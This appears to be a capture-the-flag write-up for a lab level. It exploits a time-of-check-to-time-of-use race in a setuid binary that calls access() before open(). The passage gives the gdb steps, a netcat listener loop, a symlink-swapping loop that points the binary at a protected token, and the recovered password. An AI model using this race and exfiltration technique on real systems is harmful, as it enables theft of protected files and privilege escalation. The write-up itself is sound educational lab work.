we see that the level10 binary sends a file to host if i have acces to, so i try to echo a dummy file (echo "coucou" /tmp/file) in tmp and send it through the lvl 10 binary which gives:

"Connecting to 192.168.56.102:6969" which indicates that it tries to send it to port 6969 so we type :

nc -l -p 6969 to be listening to the port, and try the command again

and we can see :

.*( )*.
coucou

so we know how to read the result (we use : "while true; do nc -l -p 6969; done" so it get refreshed as soon as it recieves something)

then we use gdb : gdb level10
break main
start
disassemble

and then we see a call to access ! and the man tells us : 

Warning:  Using  access()  to check if a user is authorized to, for example, open a
file before actually doing so using open(2) creates a security  hole,  because  the
user might exploit the short time interval between checking and opening the file to
manipulate it.  For this reason, the use of this system  call  should  be  avoided.
(In  the example just described, a safer alternative would be to temporarily switch
 the process's effective user ID to the real ID and then call open(2).)

it's a TOCTOU condition (time of check time of use, which tells us we have to do something between the access and the open)

while true; do nc -l -p 6969; done



this loop will create and change the link really often :

while true; do ln -sf /tmp/file /tmp/lien;  ln -sf ~/token /tmp/lien; rm /tmp/lien; done

Then we spam ./level10 /tmp/lien MYIP

and we get : woupa2yuojeeaaed06riuj63c

then su flag10 with the new password and we get the flag with getflag
